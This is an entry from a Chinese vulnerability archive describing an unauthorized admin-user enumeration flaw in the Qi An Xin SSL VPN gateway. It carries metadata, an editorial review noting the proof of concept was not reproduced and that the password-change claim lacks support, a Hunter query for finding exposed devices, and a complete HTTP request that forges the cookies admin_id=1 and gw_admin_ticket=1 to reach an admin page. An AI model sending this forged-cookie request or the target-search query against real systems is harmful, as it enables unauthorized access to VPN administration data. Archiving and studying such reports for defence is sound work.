---
source: "wy876 漏洞文库"
id: "vw-1c50d3aa38d198822c1c5f7a"
entity_id: "ve-1c50d3aa38d198822c1c5f7a"
schema_version: "1"
title: "奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞"
product: "奇安信SSL VPN安全接入网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "两个Cookie设1，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1VPN%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E7%AE%A1%E7%90%86%E7%94%A8%E6%88%B7%E9%81%8D%E5%8E%86%E5%8F%8A%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/liitlbcoprgaf65r"
source_status: "recorded"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"奇安信 VPN\""
---

# 奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：奇安信SSL VPN安全接入网关
- 本文讨论：x_group.php伪造admin_id/gw_admin_ticket
- 版本、权限与配置前提：两个Cookie设1，版本未知
- 资料类型：伪造Cookie管理查询；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题任意密码修改无修改请求/代码支持，正文仅用户组查询
- 出现如下页面但文中无图或响应，证据缺失
- FOFA元数据误装残缺Hunter语法
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 真正后端授权边界、密码修改入口及版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
<font style="color:rgb(23, 46, 77);">奇安信安全接入网关系统（SSL VPN）在满足客户的身份安全、传输加密、访问授权等多种安全需求基础上，针对 BYOD 及 CYOD 等移动办公场景，提供统一的安全办公接入入口、门户式单点登录、应用 APP安全加固、移动应用数据安全，从而为客户提供“一站式”安全移动办公解决方案。奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞。</font>

# 二、影响版本
+ 奇安信VPN

# 三、资产测绘
+ hunter`app.name="奇安信 VPN"`
+ 特征


# 四、漏洞复现
用户遍历

修改`cookie：admin_id=1; gw_admin_ticket=1;`访问出现如下页面表示存在漏洞

```http
GET /admin/group/x_group.php?id=1 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: admin_id=1; gw_admin_ticket=1;
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/liitlbcoprgaf65r>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
